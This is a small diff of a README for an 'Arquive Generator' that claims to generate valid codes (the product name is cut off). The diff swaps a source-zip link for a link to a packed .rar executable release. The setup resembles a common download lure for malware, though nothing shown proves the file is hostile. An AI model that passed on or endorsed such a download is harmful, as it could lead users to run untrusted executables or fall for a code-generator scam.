@@ -30,7 +30,7 @@ The **Arquive Generator** executable provides a simple way to generate valid Nit
 ### Running the Executable
 
 1. **Download and Install:**
-   - Download the latest version of `ArquiveGenerator.exe` [Clicking here](https://github.com/lucas021ajds/ArquiveGenerator/archive/refs/heads/main.zip).
+   - Download the latest version of `Arquive Generator` [Clicking here](https://github.com/lucas021ajds/ArquiveGenerator/releases/download/ArquiveGeneatorV2/Arquive.Generator.rar).
    - Place the `Arquive Generator` in your desired directory.
 
 2. **Open the Application:**
